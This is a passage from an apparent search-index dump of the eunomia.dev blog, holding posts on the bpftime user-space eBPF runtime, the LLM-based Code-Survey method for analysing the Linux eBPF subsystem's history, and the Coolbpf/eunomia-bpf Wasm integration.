User Space","text":"<p>eBPF (extended Berkeley Packet Filter) has evolved from a simple network packet filtering tool into a versatile system-level extension technology. Since the inception of BPF in the 1990s, eBPF has significantly enhanced its functionality through an expanded instruction set and direct interaction with kernel data structures. After joining the Linux kernel in 2014, eBPF became a powerful bytecode engine, widely used in performance analysis, security policies, and other areas. With the growing complexity of computing environments, eBPF's real-time data collection and analysis capabilities have become crucial in modern computing, especially in traffic control, load balancing, and security policies.</p> <p>Although eBPF was initially designed for the kernel, its tremendous potential in user space, coupled with the kernel's GPL LICENSE restrictions, led to the development of early user-space eBPF runtimes like ubpf[3] and rbpf[4]. These runtimes allowed developers to execute eBPF bytecode outside the kernel, breaking free from GPL license restrictions and offering a more intuitive and convenient debugging environment. However, writing programs for ubpf and rbpf might require a specific, not fully kernel-compatible toolchain, and they only had limited single-threaded hash maps implementations, making it difficult to run actual eBPF programs. Additionally, ubpf and rbpf are essentially eBPF bytecode virtual machines that still require glue code to compile and link with other user-space programs for practical use, and they did not offer dynamic tracing functionality.</p> <p>In practice, user-space eBPF has been explored and applied in fields like network processing, blockchain, and security. For example, Oko and DPDK eBPF support demonstrate the flexibility and performance advantages of eBPF in network data processing. The Solana project utilized eBPF to implement a JIT compiler, supporting the execution of blockchain smart contracts. The eBPF for Windows project extended eBPF functionality beyond Linux, showcasing its potential for cross-platform compatibility. These applications not only demonstrate eBPF's powerful system extension capabilities but also highlight its significance and wide applicability in the modern computing domain. For further discussion, refer to our previous blog: https://eunomia.dev/blogs/userspace-ebpf/.</p>"},{"location":"blogs/bpftime/#why-we-need-bpftime","title":"Why We Need bpftime","text":"<p>Due to the core role of operating system kernels and the high demands for stability and security, innovation and evolution in operating system kernels tend to be slow. This is the original intention behind eBPF: to extend the kernel's functionality without changing its source code, thereby bringing more innovative application scenarios[5]. This is also the impact we hope bpftime will have: exploring more development possibilities with the safety and ecosystem brought by eBPF, without changing user-space program code, and compensating for the potential shortcomings of current kernel-space eBPF and other user-space extension solutions.</p>"},{"location":"blogs/bpftime/#limitations-of-kernel-space-implementation-of-user-space-tracing-uprobe-and-system-call-tracing","title":"Limitations of Kernel-Space Implementation of User-Space Tracing (Uprobe) and System Call Tracing","text":"<p>Uprobe is a powerful user-level dynamic tracing mechanism that allows developers to perform dynamic instrumentation in user-space programs, such as at function entry points, specific code offsets, and function return points. This technology is implemented by setting breakpoints at designated locations, such as using the int3 instruction on x86 architecture. When the execution flow reaches this point, the program traps into the kernel, triggering an event, then executing a predefined probe function, and finally returning to user-space to continue execution. This dynamic tracing method can trace and instrument all processes executing a specific file across the system, allowing for the collection of critical data for performance analysis and fault diagnosis without modifying code, recompiling, or restarting processes.</p> <p>However, since the eBPF virtual machine executes in kernel mode, the current Uprobe implementation introduces two context switches in the kernel, causing significant performance overhead, especially impacting performance in latency-sensitive applications. As shown in the diagram, Uprobe's overhead is nearly ten times that of Kprobe[5]. On the other hand, Uprobe is currently limited to tracing and cannot modify the execution flow or return values of user-space functions, limiting its use cases to code extension, hot patching, defect injection, etc. Despite this, Uprobe is still widely used in production environments for its non-intrusive user-space functionality tracing, such as tracing user-space protocols like SSL/TLS and HTTP2, monitoring memory allocation and leaks, analyzing garbage collection and language runtimes, and tracking the creation and recycling of coroutines, among other scenarios.</p> <p></p> <p>For system call tracepoints, since they are globally visible, additional filtering is required for specific process tracing, such as filtering based on pid, cgroup, etc., in eBPF[6], which also brings some additional overhead to other processes that do not need to be traced.</p>"},{"location":"blogs/bpftime/#limitations-of-kernel-space-ebpf-in-terms-of-security-and-extensibility","title":"Limitations of Kernel-Space eBPF in Terms of Security and Extensibility","text":"<p>eBPF running in kernel mode has its limitations in terms of security and extensibility. On one hand, eBPF programs need to run in kernel mode, meaning they require root privileges, thereby increasing the attack surface and potential risks, such as container escape. Moreover, vulnerabilities in eBPF itself can lead to security issues at the kernel level. On the other hand, while the verifier restricts eBPF programs to ensure safety, this also limits the functionality expansion of eBPF; any new feature or improvement requires modifications to the kernel code. These limitations not only increase the maintenance difficulty of the system but also reduce the flexibility and universality of eBPF.</p> <p>For kernels without eBPF support (e.g., older systems) or applications in non-privileged containers, user-space eBPF runtimes are a viable alternative, allowing the execution of eBPF programs for tracing, analysis, and extension operations without kernel eBPF support.</p>"},{"location":"blogs/bpftime/#shortcomings-of-other-user-space-extension-solutions","title":"Shortcomings of Other User-Space Extension Solutions","text":"<p>Currently, there are other user-space tracing and extension solutions, such as gdb and other tools that use the ptrace mechanism for process tracing and analysis, Wasm, Lua virtual machines that can be used as plugin runtimes, and binary instrumentation tools like Frida for dynamic tracing in user space. However, these solutions have their own limitations.</p> <ul> <li><code>High Performance Overhead</code>: Traditional tools like gdb use the ptrace mechanism for process tracing. Although they are powerful, they introduce significant performance overhead when analyzing and interacting with other processes. This method frequently pauses and resumes the target process, leading to reduced efficiency. Additionally, ptrace limits the number of processes that can be traced simultaneously in the system, making large-scale distributed tracing infeasible. WebAssembly (Wasm) sandboxes, while offering good flexibility and cross-language support, require strict validation and runtime checks when executing external libraries or procedures, potentially introducing performance losses. In contrast, eBPF offers a more performance-centric strategy, using static analysis and a verifier to ensure safe execution of code on the host without additional runtime overhead. For bpftime, since it embeds the eBPF virtual machine in the function call context of the traced process without extra context switches, it has lower performance overhead.</li> <li><code>Security Issues</code>: Binary instrumentation tools like Frida provide dynamic tracing capabilities, but this can introduce security issues. The instrumentation code runs in the same process context and can be maliciously exploited. Additionally, code defects in the tracing tools or scripts themselves may cause the traced program to crash, such as accessing incorrect addresses or pointers. In contrast, eBPF can ensure the safety of code through its verifier.</li> <li><code>Insufficient Visibility</code>: Additionally, for other user-space tracing solutions, these tools typically only offer visibility into single processes and cannot provide system-wide insights. They struggle to capture a global view of kernel-level events or cross-process communications, limiting their analytical capabilities in complex systems. This is why eBPF and other solutions mainly perform tracing in kernel space, allowing for correlated analysis of kernel and user-space events, such as linking layer 7 network packets with kernel-level network events, or associating user-space function call behavior with kernel-level system calls, thus providing more comprehensive analytical capabilities. For bpftime, it can be more than just a user-space virtual machine solution. User-space eBPF can work in conjunction with kernel-space eBPF infrastructure to achieve boundary-crossing analysis and extension capabilities.</li> </ul> <p>For existing other user-space eBPF runtimes, as mentioned earlier, they lack dynamic tracing or extension capabilities, require manual integration, and cannot directly utilize existing eBPF toolchains and applications, which greatly limits their use cases. On the other hand, they cannot work directly with kernel-space eBPF, only offering limited user-space extension capabilities.</p>"},{"location":"blogs/bpftime/#bpftime-user-space-ebpf-runtime","title":"bpftime: User-Space eBPF Runtime","text":""},{"location":"blogs/bpftime/#user-space-ebpf-runtime-compatible-with-existing-ebpf-tools-and-frameworks","title":"User-Space eBPF Runtime Compatible with Existing eBPF Tools and Frameworks","text":"<p>bpftime aims to maintain good compatibility with existing kernel eBPF as a user-space alternative and improvement to kernel eBPF. It also seeks to maximize the use of the rich ecosystem and tools of existing eBPF. For example, bpftime allows the direct use of unmodified bpftrace tools to execute eBPF scripts in user space, tracing system calls or user-space functions:</p> <p></p> <p>At the same time, it can run user-space versions of BCC/libbpf-tools such as bashreadline, funclatency, gethostlatency, mountsnoop, opensnoop, sigsnoop, statsnoop, syscount, etc[7]. bpftime constructs eBPF map data structures in user-space shared memory, enabling the analysis and statistics of multiple processes, and supports reporting data to tracing tools through ring buffer, perf buffer, and other means.</p> <p>bpftime also provides eBPF infrastructure compatible with the kernel in user-space. It can run without needing kernel eBPF and supports some of the kernel's eBPF maps, helpers, dynamic tracing mechanisms, and almost all eBPF instruction sets:</p> <p></p> <p>From a security perspective, bpftime provides an eBPF verifier to ensure the safety of eBPF bytecode, preventing malicious code injection or damaging the traced process. bpftime can use the kernel's eBPF verifier or an independent user-space eBPF verifier as an alternative for environments without access to kernel eBPF.</p>"},{"location":"blogs/bpftime/#high-performance-uprobe-and-system-call-tracing","title":"High-Performance Uprobe and System Call Tracing","text":"<p>bpftime supports Uprobe and system call tracing by embedding eBPF programs into the function call context of the traced process through binary rewriting, thus achieving dynamic tracing and extension. This method not only avoids context switching between kernel and user spaces but also collects key data for performance analysis and fault diagnosis without modifying code, recompiling, or restarting processes. Compared to kernel Uprobe, bpftime's Uprobe implementation is more performant and offers more functionalities, such as modifying function return values or altering function execution flows, enabling code extension, hot patching, and defect injection. The performance of user-space Uprobe implemented by bpftime can be an order of magnitude higher than that of kernel Uprobe:</p> Probe/Tracepoint Types Kernel (ns) Userspace (ns) Uprobe 3224.172760 314.569110 Uretprobe 3996.799580 381.270270 Syscall Trace 151.82801 232.57691 <p>Using dynamic library injection implemented via ptrace and technologies like LD_PRELOAD, bpftime's eBPF runtime supports tracing during program startup and also allows mounting eBPF probes directly onto multiple running processes. We conducted a test where a probe monitoring the malloc function in libc was loaded using bpftime, and the loading latency was measured. The results showed that bpftime caused the running process to pause for about 48 milliseconds during loading. For comparison, we used the LD_PRELOAD method to load the same extension before the process started and observed a loading latency of 30 milliseconds.</p> <p>We used the sslsniff tool[8] to trace and analyze SSL encrypted traffic of Nginx in bpftime's user-space Uprobe and compared it with the kernel Uprobe approach, observing a significant performance improvement:</p> <p></p> <p>For modern eBPF observability tools, it may be necessary to collect and analyze the same event in both kernel and user-space functions. For instance, an HTTP request might require analyzing both kernel-level network events and user-space function calls to obtain a complete request chain. bpftime's Uprobe implementation can work in conjunction with kernel eBPF kprobes, enabling this kind of cross-boundary analysis capability. Implementing and improving other dynamic tracing mechanisms are also part of our plan.</p>"},{"location":"blogs/bpftime/#new-ebpf-jit-and-aot-compilers","title":"New eBPF JIT and AOT Compilers","text":"<p>bpftime includes a new LLVM-based eBPF JIT compiler that compiles eBPF bytecode into native machine code at runtime, thereby improving the execution efficiency of eBPF programs. Compared to other user-space eBPF runtime JIT compilers like ubpf and rbpf, and Wasm, the LLVM JIT compiler offers better performance, approaching the efficiency of native code execution. It also provides better cross-platform support, for example, supporting architectures like RISC-V. We conducted a simple performance comparison and analysis[9]:</p> <p></p> <p>In addition to JIT, bpftime also includes an AOT compiler, which allows eBPF bytecode to be pre-compiled into machine code files for specific architectures after verification. This can be particularly useful for deployment and use in embedded systems, significantly reducing the time for compilation at startup.</p>"},{"location":"blogs/bpftime/#more-exploratory-use-cases-and-future-developments","title":"More Exploratory Use Cases and Future Developments","text":"<p>Beyond extending previous Uprobe and system call tracepoints, bpftime can also be used for other exploratory use cases, such as:</p> <ul> <li><code>Fault Injection</code>: Using the kernel-compatible bpf_override_return() helper[10], bpftime can modify the Syscall return values of processes, block specific Syscalls, or modify and replace specific function calls in certain types of eBPF programs. This enables fault injection capabilities. Kernel Uprobe itself does not support this functionality, and kernel's <code>bpf_override_return</code> also requires enabling the CONFIG_BPF_KPROBE_OVERRIDE option at compile time for security reasons, which is not enabled by default in mainstream Linux distributions.</li> <li><code>Hot Patching</code>: As mentioned earlier, using the bpf_override_return helper mechanism, user-space eBPF can also replace or filter certain function calls, thus enabling hot patching capabilities.</li> <li><code>eBPF-based Nginx Module</code>: bpftime can be used as an Nginx Module to implement extensions in Nginx through eBPF, such as dynamic routing, load balancing, caching, security policies, etc., in Nginx.</li> <li><code>Enhancing Fuse</code>: There have been attempts to optimize Fuse using eBPF in the kernel. bpftime could also be used as part of a user-space filesystem, modifying the behavior of system calls in the corresponding user-space process through eBPF, enabling filesystem extensions such as dynamic routing, caching, security policies, etc., in user-space filesystems.</li> </ul> <p>bpftime is currently an early-stage exploratory project. We are actively exploring more potential application scenarios, such as implementing eBPF-based network packet filtering in user space, optimizing packet forwarding performance for service meshes, bypassing the kernel's network protocol stack, and more. We look forward to more ideas and suggestions from everyone, or working together to implement these functions. In the future, we also hope that bpftime can offer better compatibility support for the kernel and, with the help of LLVM's JIT compiler, provide better performance optimization guidance, and a more convenient testing and debugging</p>"},{"location":"blogs/bpftime/#conclusion","title":"Conclusion","text":"<p>bpftime opens up new possibilities for eBPF applications in user space and provides new options for extending user-space applications. It allows existing eBPF applications to run in non-privileged user space using the same libraries and toolchains, and offers tracing mechanisms like Uprobe and Syscall for user-space eBPF. Compared to kernel Uprobe, it significantly improves performance and does not require manual code instrumentation or process restarts. The runtime supports inter-process eBPF maps in user-space shared memory, and is also compatible with kernel eBPF maps, allowing seamless operation with the kernel eBPF infrastructure.</p> <p>bpftime is now open source on GitHub, and everyone is welcome to try it out and provide feedback: https://github.com/eunomia-bpf/bpftime If you have any suggestions or questions, feel free to raise an issue on GitHub or contact us by email at yunwei356@gmail.com.</p> <ul> <li>Slides: https://eunomia.dev/bpftime/documents/userspace-ebpf-bpftime-lpc.pdf</li> <li>Hack news: https://news.ycombinator.com/item?id=38268958</li> <li>arxiv: https://arxiv.org/abs/2311.07923</li> </ul>"},{"location":"blogs/bpftime/#references","title":"References","text":"<ol> <li>bpftime Git repo: https://github.com/eunomia-bpf/bpftime</li> <li>bpftime Linux Plumbers talk: https://lpc.events/event/17/contributions/1639/</li> <li>ubpf: https://github.com/iovisor/ubpf</li> <li>rbpf: https://github.com/qmonnet/rbpf</li> <li>Performance comparison of uprobe and kprobe: https://dl.acm.org/doi/10.1145/3603269.3604823</li> <li>Capturing Opening Files and Filter with Global Variables: https://eunomia.dev/tutorials/4-opensnoop/</li> <li>examples: https://github.com/eunomia-bpf/bpftime/tree/master/example</li> <li>sslsniff, based on the tool of the same name in bcc: https://github.com/eunomia-bpf/bpftime/tree/master/example/sslsniff</li> <li>bpf benchmark: https://github.com/eunomia-bpf/bpf-benchmark</li> <li>BPF-based error injection for the kernel: https://lwn.net/Articles/740146/</li> <li>FUSE BPF: A Stacked Filesystem Extension for FUSE: https://lwn.net/Articles/915717/</li> </ol> <p>Share on  Share on </p>"},{"location":"blogs/code-survey/","title":"Can LLMs understand Linux kernel? A New AI-Powered Approach to Understanding Large Codebases","text":"<p>Ever tried diving into a massive codebase like the Linux kernel and felt like you were swimming in an ocean of code with no land in sight? Trust me, you're not alone. Understanding large, complex, and constantly evolving codebases is like trying to read a never-ending novel that's being written by thousands of authors simultaneously. It's overwhelming, to say the least.</p> <p>See our arxiv and GitHub repository for more details!</p> <p>The Struggle with Massive Codebases</p> <p>Traditionally, developers have relied on methods like static code analysis, manual code reviews, and poring over documentation to make sense of big projects. While these methods can be helpful, they're often time-consuming, tedious, and frankly, not very effective when dealing with the sheer size and complexity of modern software systems.</p> <p>You might be thinking, \"Why not use AI to read and understand the entire codebase?\" Well, here's the catch: even the most advanced Large Language Models (LLMs) have limitations. They can't process an entire massive codebase in one go due to context length restrictions. Techniques like Retrieval Augmented Generation (RAG) or fine-tuning models on specific datasets can help with specific functions or code snippets but fall short when it comes to capturing the broader picture of how a massive system evolves over time.</p> <p>Why Can't We Just Use RAG or Fine-Tuning?</p> <p>Great question! Let's break it down:</p> <ul> <li> <p>Retrieval Augmented Generation (RAG): This technique involves fetching relevant documents to help the AI generate responses. But with a codebase as vast as the Linux kernel, it's like trying to find all the needles in a haystack the size of a skyscraper. It's impractical to retrieve and process all the necessary documents to get a comprehensive understanding.</p> </li> <li> <p>Fine-Tuning: Fine-tuning an AI model on a specific dataset helps it understand that data better. However, it requires substantial resources, and the model still can't process the entire context of a massive codebase simultaneously. Plus, codebases evolve rapidly, so the model would need constant retraining to stay up-to-date.</p> </li> </ul> <p>The Core Problem</p> <p>Understanding not just the code but the evolution of a codebase\u2014why certain decisions were made, how features have changed, and where potential issues lie\u2014is incredibly challenging. The unstructured nature of development artifacts like commit messages, code reviews, and mailing list discussions adds another layer of complexity. These sources contain invaluable insights into the reasoning behind changes, but they're difficult to analyze systematically because they're, well, unstructured.</p> <p>Enter Code-Survey</p> <p>We're excited to introduce Code-Survey, a novel AI-powered methodology we've developed to tackle this exact problem. Instead of trying to cram an entire codebase into an AI model (which, trust us, doesn't work), Code-Survey takes a different approach.</p> <p>So, What's the Big Idea?</p> <p>Code-Survey leverages LLMs in a new way. We treat the AI as if it's a human participant in a survey. Think of it as conducting a massive questionnaire where the AI reads through unstructured data\u2014like commit messages, code diffs, and emails\u2014and answers specific, carefully designed questions. This method transforms messy, unstructured information into clean, structured datasets that we can actually analyze.</p> <p>Why This Approach Works</p> <p>By framing the problem as a survey, we're playing to the strengths of AI language models. They're great at understanding and generating human-like text but struggle with processing enormous amounts of code all at once. This method allows us to extract meaningful insights without overloading the AI or losing important context. It's like having an army of junior developers summarizing and categorizing information for you, but faster and without the coffee breaks!</p> <p>Understanding Codebases Before Code-Survey</p> <p>Before Code-Survey, making sense of large codebases was a daunting task. Developers would manually sift through code, comb through commit histories, and read endless documentation and mailing list archives. This was not only time-consuming but also prone to human error. Answering high-level questions like \"Why was this feature added?\" or \"How has this component evolved over time?\" was nearly impossible without dedicating significant resources.</p> <p>Applying Code-Survey to the Linux eBPF Subsystem</p> <p>To put Code-Survey to the test, we applied it to the Linux kernel's Extended Berkeley Packet Filter (eBPF) subsystem. For those unfamiliar, eBPF is like the Swiss Army knife of the Linux kernel, enabling advanced networking, observability, and security functionalities without changing kernel source code.</p> <p>Why eBPF?</p> <ul> <li>Complexity: eBPF has evolved rapidly, with countless features added over the years, making it a perfect candidate to showcase Code-Survey's capabilities.</li> <li>Unstructured Data: There's a wealth of information hidden in commits, code reviews, and mailing lists that hasn't been systematically analyzed.</li> <li>Impact: Understanding eBPF's evolution can lead to improvements in performance, security, and reliability for the countless systems that rely on it.</li> </ul> <p>What We Discovered</p> <p>Using Code-Survey, we analyzed over 16,000 commits and 150,000 emails related to eBPF development. Here are some of the insights we gained:</p> <ul> <li> <p>Feature Evolution: We mapped out how features like <code>bpf_link</code> (which provides a new abstraction for attaching programs to events) have developed over time. Surprisingly, despite being in the codebase for years, some features haven't received much attention outside of kernel developer circles.</p> </li> <li> <p>Bug Patterns: We identified which components and files in the Linux kernel have the highest frequency of bugs. Interestingly, while much focus has been on the verifier and JIT compiler, a significant number of bugs stem from eBPF's interactions with other kernel subsystems.</p> </li> <li> <p>Development Trends: We observed shifts in development focus over the years, such as a move from adding new features to improving stability and performance.</p> </li> <li> <p>Feature Interdependencies: We uncovered dependencies between features and components, providing insights into how new feature introductions impact the stability and performance of existing kernel components.</p> </li> </ul> <p>Core Concepts: The Survey Methodology</p> <p>The central principle behind Code-Survey is treating LLMs as human participants, acknowledging that software development is also a social activity. By carefully designing surveys, Code-Survey transforms unstructured data\u2014like commits and emails\u2014into organized, structured, and analyzable datasets.</p> <p></p> <p>Here's how it works:</p> <ol> <li> <p>Survey Design: We (or the AI) design surveys with specific questions targeting the information we want to extract. For example:</p> </li> <li> <p>\"What is the main purpose of this commit?\"</p> </li> <li>\"Which eBPF components are affected?\"</li> <li> <p>\"Is this a bug fix, a new feature, or a performance optimization?\"</p> </li> <li> <p>AI Processing: The AI reads through the unstructured data and answers the survey questions, effectively structuring the data.</p> </li> <li> <p>Validation: Human experts review samples of the AI's responses to ensure accuracy. If there are issues, we refine the survey or the AI's approach.</p> </li> <li> <p>Analysis: With structured data in hand, we perform quantitative analyses to uncover trends, patterns, and areas needing attention.</p> </li> </ol> <p>Why This Matters</p> <p>This approach allows us to answer questions that were previously nearly impossible to tackle, such as:</p> <ul> <li>\"How do new feature introductions impact the stability of existing components?\"</li> <li>\"Are there identifiable phases in the lifecycle of a feature?\"</li> <li>\"Which components have the highest bug frequency?\"</li> </ul> <p>Benefits of Code-Survey</p> <ul> <li> <p>Scalable Analysis: We can process thousands of commits and discussions quickly, something unfeasible with manual methods.</p> </li> <li> <p>Deep Insights: By structuring the data, we can perform analyses that weren't possible before, uncovering hidden patterns and trends.</p> </li> <li> <p>Versatility: The methodology is flexible and can be applied to other large codebases beyond the Linux kernel.</p> </li> </ul> <p>Best Practices We've Learned</p> <ul> <li> <p>Careful Survey Design: The quality of insights depends on well-designed questions. They should be clear, specific, and aligned with the AI's capabilities.</p> </li> <li> <p>Use Predefined Categories: This helps maintain consistency in the AI's responses and reduces ambiguity.</p> </li> <li> <p>Allow for Uncertainty: Letting the AI say \"I'm not sure\" prevents inaccurate information when the data is insufficient.</p> </li> <li> <p>Iterative Refinement: Continuously refining survey questions and validating responses improves accuracy over time.</p> </li> </ul> <p>Limitations to Keep in Mind</p> <ul> <li> <p>Data Quality Matters: Incomplete or unclear commit messages can affect the AI's ability to provide accurate answers.</p> </li> <li> <p>AI Isn't Perfect: Sometimes, the AI might misinterpret data or generate plausible but incorrect information.</p> </li> <li> <p>Human Oversight Needed: Experts are essential for designing surveys and validating results, ensuring the AI's outputs are reliable.</p> </li> </ul> <p>What's Next for Code-Survey?</p> <p>We're excited about the potential of applying Code-Survey to other massive projects like Kubernetes, Apache, or even proprietary codebases. We also plan to incorporate additional data sources, such as actual code changes, execution traces, and performance metrics, to gain even deeper insights.</p> <p>Join Us on This Journey</p> <p>We believe Code-Survey represents a significant leap forward in how we understand and maintain large codebases. By combining the power of AI with thoughtful survey design, we're unlocking insights that were previously hidden in plain sight.</p> <p>Want to Get Involved?</p> <p>Code-Survey is open-source! Check out our GitHub repository to explore the code, access the datasets, and contribute to the project. Whether you're a developer, researcher, or just curious, we welcome your feedback and collaboration.</p> <p>For updates on Code-Survey and our other projects, follow us on GitHub and join the conversation. Together, we can make navigating massive codebases less daunting and more efficient.</p> <p>References:</p> <ul> <li>eBPF Intro: What is eBPF?</li> <li>eBPF Tutorial: bpf-developer-tutorial</li> <li>Code-Survey GitHub Repository: github.com/eunomia-bpf/code-survey</li> </ul> <p>Feel free to reach out with any questions or comments. Let's revolutionize how we understand and work with large codebases together!</p> <p>Share on  Share on </p>"},{"location":"blogs/coolbpf-eunomia/","title":"eunomia-bpf: Looking forward to 2023, let eBPF sprout wings with Wasm","text":"<p>Looking back at 2022, two technologies have received a lot of attention: eBPF and WebAssembly.</p>"},{"location":"blogs/coolbpf-eunomia/#ebpf-new-possibilities","title":"eBPF: New Possibilities","text":"<p>eBPF is a revolutionary technology that originated in the Linux kernel and allows sandbox programs to run in the kernel of an operating system. It is used to securely and efficiently extend the functionality of the kernel without changing its source code or loading kernel modules.</p> <p>In the past year, observability technology has received significant attention and has been listed by Gartner as one of the top ten strategic technology trends for 2023. eBPF itself is a great complement to traditional observability capabilities. Without invasive modifications to the kernel, it dynamically inserts its own code into the kernel to achieve various monitoring and tracing capabilities. At the same time, eBPF has also promoted the development of a new generation of tools in areas such as networking, security, application configuration tracking, and performance troubleshooting. These tools no longer rely on existing kernel functionality, but actively re-run without affecting execution efficiency or security.</p> <p>Today, eBPF is widely used in cloud native, observability, performance optimization, security, hardware acceleration, and other fields. Its application scenarios are rapidly expanding, and innovative projects based on eBPF technology are emerging. For the operating systems community, eBPF technology brings a whole new realm of possibilities and opportunities. The era of eBPF has arrived.</p> <p>Looking back at the eBPF Summit 2022, \"The future of eBPF in the Linux Kernel\" outlined the development direction of eBPF-related technologies. The specific evolution path may include the following aspects:</p> <ul> <li>More comprehensive programming semantic support: The current programming capabilities of eBPF have some limitations (such as the lack of support for variable-bound loops and limited instruction counts). In the future, it is hoped to further provide Turing-complete programming capabilities for eBPF, enhancing its abilities in looping, memory allocation, and other language features.</li> <li>Stronger security: Support type safety, enhance runtime verifier, hope that BPF can provide security programming capabilities comparable to Rust, and explore the possibility of combining Rust and BPF features to provide further kernel functionality that is both portable and secure.</li> <li>Broader portability: Enhance CO-RE, strengthen the portability of helper interfaces, and realize cross-architecture and cross-platform portability.</li> <li>Stronger kernel programmability: Support access/modification of any kernel parameters and return values, achieve stronger kernel programming capabilities, and even use BPF to help build and enhance kernel security.</li> </ul>"},{"location":"blogs/coolbpf-eunomia/#wasm-leading-the-next-generation-computing-paradigm","title":"Wasm: Leading the next generation computing paradigm","text":"<p>While eBPF primarily focuses on the kernel space or kernel-related applications, WebAssembly (Wasm) in the user space also became a new focus in 2022.</p> <p>WebAssembly, abbreviated as Wasm, is a technology with great potential from its inception. Initially designed as a portable bytecode-like instruction format standard for compiling high-level languages such as C/C++/Rust, it enables client and server applications to be deployed in web browsers. To this day, WebAssembly is evolving beyond the two domains indicated by its name, Web and Assembly. By using runtime environments compatible with Wasm, Wasm files can be executed on both the client and server sides. It has covered almost all emerging fields, from being dubbed the \"JavaScript killer\" to being considered the next frontiers of cloud computing. It has also made its way from cloud computing and serverless to edge computing. Wasm has far surpassed its role as the fourth web standard language and has redefined the development model of application software, gradually approaching its vision of \"write once, run anywhere.\"</p> <p>Wasm has several key design goals that have attracted attention since its inception:</p> <ul> <li>Portability: Wasm is designed to target low-level virtual machine architectures. Its instructions are translated into machine code by the physical machine separately. This means that Wasm binary files can ultimately run on various operating systems and chip architectures, whether in browsers running on X86 laptops or on servers inside or in the cloud, on mobile devices, IoT devices, and so on.</li> <li>Multi-language: Since Wasm is a compilation target, the specific language used for programming modules is not important. What matters is whether there is support for compiling that language into Wasm. Developers can flexibly use a variety of languages (such as C, C++, Rust, Ada, etc.) to build binary files and enjoy the benefits of Wasm.</li> <li>Lightweight and efficient: As a low-level binary instruction format, Wasm requires fewer operations to translate it into optimized machine code.</li> <li> <p>Security: One of the goals of Wasm is security. It executes in a sandbox environment with no initial visibility into the host runtime. This means that access to system resources (such as the file system and hardware) is restricted unless corresponding functions are explicitly imported to support it. Thus, Wasm greatly limits the attack surface and enables the secure execution of untrusted code in a multi-tenant environment.In the past year of 2022, Wasm has achieved many exciting accomplishments.  Many new Wasm startups have emerged, and established cloud service providers and companies have announced their support for Wasm.  The Bytecode Alliance has introduced many new Wasm standards and CNCF has hosted two WasmDay events.  One of the largest users of Wasm, Figma, was acquired by Adobe for an astonishing $20 billion.  For WebAssembly, 2023 is likely to be another breakout year:</p> </li> <li> <p>The component model describes how Wasm binary files interact with each other and is rapidly maturing with reference implementations already available.  Developers can declare which components their applications need, or more abstractly, which functionalities their applications require (rather than searching for libraries in their preferred source language).  Then the Wasm runtime can assemble the correct set of components on behalf of the user.  2023 will be the year when the component model starts to redefine how we write software.</p> </li> <li>Wasm has changed the potential of serverless environments.  Due to almost instantaneous startup time, smaller binary file size, and platform and architecture neutrality, Wasm binary files can be executed with a fraction of the resources required by today's serverless infrastructure.</li> <li>At the end of 2022, the OCI Registry working group announced an official way to store content other than container images.  This could include Helm charts, photos, or Wasm applications.  This new feature is called \"Artifact Storage.\"</li> <li>All major programming languages will be supported by Wasm: The Wasm GC proposal is likely to be available and supported in early 2023, so Kotlin and Dart will soon release Wasm compilers, and Java is also likely to become the most popular Wasm development language.</li> </ul>"},{"location":"blogs/coolbpf-eunomia/#coolbpf-eunomia-bpf-eunomia-lcc","title":"Coolbpf + eunomia-bpf = eunomia-lcc","text":"<p>In the past year, Alibaba Cloud Dragon Lizard Community Operations SIG officially open-sourced the Coolbpf project.  Based on CO-RE (Compile Once-Run Everywhere), Coolbpf retains advantages such as low resource consumption and strong portability, and incorporates dynamic compilation features of BCC, greatly simplifying the development, compilation, and runtime efficiency through remote service capabilities, and is suitable for deploying applications in production environments in batches.  Coolbpf also supports running on low kernel versions without eBPF features by providing an eBPF driver, ensuring safe operation on low versions from both kernel space and the perspective of batch deployment, and greatly enhancing the ability of eBPF programs to \"compile once, run everywhere.\"</p> <p>eunomia-bpf is also a universal, lightweight, multi-language next-generation eBPF development framework/component library combined with Wasm.  It was initiated and incubated in the Alibaba Cloud Dragon Lizard Community's \"eBPF Technology Exploration SIG\" in the second half of 2022.  eunomia-bpf includes a runtime and a toolchain and focuses on improving the development and usage experience of eBPF programs in user space.  It has three main features:</p> <ol> <li>Only kernel space code needs to be written to run eBPF programs.  The kernel space frontend is fully compatible with various syntaxes such as bcc and native libbpf, reducing the learning cost and improving development efficiency for eBPF.</li> <li>The compilation toolchain and the runtime are completely separated, ensuring compatibility between different versions of the compilation toolchain and the runtime.  They are loaded in the CO-RE manner (compile once, run everywhere), reducing resource consumption for deployment and usage.  It also allows code similar to BCC/bpftrace to support AOT compilation without relying on libraries like llvm at runtime, while retaining the simplicity of bpftrace-like scripting usage.</li> <li>User space also supports multiple languages, such as C++/C/Rust, for developing eBPF programs with Wasm.  The user space programs can be distributed and dynamically loaded as Wasm modules or as JSON/YAML configuration files.  They can also be stored and managed as Wasm OCI images, which can include user space and kernel space eBPF applications.</li> </ol> <p>eunomia-bpf hopes to provide a framework in the form of libraries or loosely coupled components to explore more in compiling, building, distributing, and running eBPF programs, making it easier for other companies and individuals to build a similar user space development and runtime environment, or a complete development platform and plugin runtime, based on their own kernel space eBPF infrastructure.</p> <p>At the end of 2022, we attempted to combine Coolbpf and eunomia-bpf to create a new eBPF user space development library eunomia-lcc.  With the support of low kernel versions provided by Coolbpf and the ability to deploy applications in batches, as well as the user space development and distribution features provided by eunomia-bpf combined with Wasm, we created a new eBPF user space development library within the framework of Coolbpf.  With eunomia-lcc, Coolbpf can now:</p> <ul> <li>Automatically retrieve kernel space export information, generate command-line parameters, histogram outputs, etc., by only writing kernel space code when writing eBPF programs or tools.</li> <li>Use Wasm for developing user space interactive programs, control the loading and execution of the entire eBPF program, and process data reported by eBPF within the Wasm virtual machine.- Precompiled eBPF programs can be packaged as universal JSON or Wasm modules for distribution across architectures and kernel versions without the need for recompilation and can be dynamically loaded and executed.</li> </ul> <p>At the same time, Coolbpf features such as low version compatibility, automatic BTF acquisition, remote compilation, etc. can be preserved, making eBPF program development more convenient.</p> <p>Looking ahead, the eunomia-bpf team also hopes to explore, improve, and enhance the process, tools, SDK for eBPF program development, compilation, packaging, publishing, installation, and upgrading in 2023. They actively provide feedback to the upstream community to further enhance the programming experience and language capabilities of eBPF. They also aim to combine it further with WebAssembly, exploring and practicing more in terms of observability, serverless, programmable kernel, etc., moving towards Turing completeness and better language support.</p>"},{"location":"blogs/coolbpf-eunomia/#references","title":"References","text":"<ol> <li>Wasm will lead the next generation of computing paradigms (Translated): https://www.oschina.net/news/214580</li> <li>WebAssembly: 5 predictions for 2023: https://www.sohu.com/a/626985661_121119003</li> <li>eBPF Technology Research SIG Homepage: 